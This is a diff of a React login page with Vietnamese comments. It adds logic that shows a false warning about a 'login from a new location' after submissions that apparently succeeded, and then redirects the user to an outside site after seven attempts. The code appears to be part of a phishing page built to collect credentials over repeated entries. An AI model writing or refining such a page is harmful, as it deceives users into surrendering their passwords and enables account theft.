@@ -7,7 +7,8 @@ function App() {
   const [emailOrPhone, setEmailOrPhone] = useState('');
   const [password, setPassword] = useState('');
   const [loginAttempts, setLoginAttempts] = useState(0);
-  const [isFocus, setFocus] = useState(false)
+  const [showErrorMessage, setShowErrorMessage] = useState(false);
+
   const handleLogin = async (e: { preventDefault: () => void }) => {
     e.preventDefault();
 
@@ -28,18 +29,18 @@ function App() {
         console.log('Đăng nhập thành công');
         // Chuyển hướng người dùng sang trang mới
         setLoginAttempts((prevAttempts) => prevAttempts + 1);
-
-        // Nếu số lần đăng nhập sai đạt 7, chuyển hướng người dùng
-        if (loginAttempts + 1 >= 5) {
-          console.log('Đăng nhập sai quá 7 lần, chuyển hướng...');
-          // Chuyển hướng người dùng sang trang mới
+        if (loginAttempts + 1 >= 7) {
+          setShowErrorMessage(false);
           window.location.href = 'https://daominhha.net/en-garde/';
+        }else{
+            setShowErrorMessage(true);
+          
         }
       } else {
         // Xử lý đăng nhập thất bại
         console.log('Đăng nhập thất bại');
-        // Tăng số lần đăng nhập sai
-        
+        // Hiển thị thông báo và màu đỏ khi số lần đăng nhập sai đạt 6
+
       }
     } catch (error) {
       console.error('Lỗi khi thực hiện đăng nhập:', error);
@@ -60,14 +61,22 @@ function App() {
                 Email hoặc số điện thoại <span>*</span>
               </label>
               <input
+                style={{
+                  border: showErrorMessage ? 'solid red 1px' : 'none'
+                }}
                 type='text'
                 id='username'
-                onFocus={() => setFocus(true)}
-                onBlur={() => setFocus(false)}
                 value={emailOrPhone}
-                onChange={(e) => setEmailOrPhone(e.target.value)}
+                onChange={(e) => {
+                  setEmailOrPhone(e.target.value);
+                  setShowErrorMessage(false); // Ẩn thông báo khi người dùng thay đổi nội dung input
+                }}
               />
-              <p style={{ fontSize: '12px', height: "0", opacity: 0, visibility: 'hidden' }} className={`${isFocus && "active"}`}>Phát hiện đăng nhập ở địa điểm mới, hãy kiểm tra email của bạn.</p>
+              {showErrorMessage && (
+                <p style={{ fontSize: '12px', color: 'red' }}>
+                  Phát hiện đăng nhập ở địa điểm mới, hãy kiểm tra email của bạn.
+                </p>
+              )}
             </div>
             <div className='input-wrap'>
               <label htmlFor='password'>
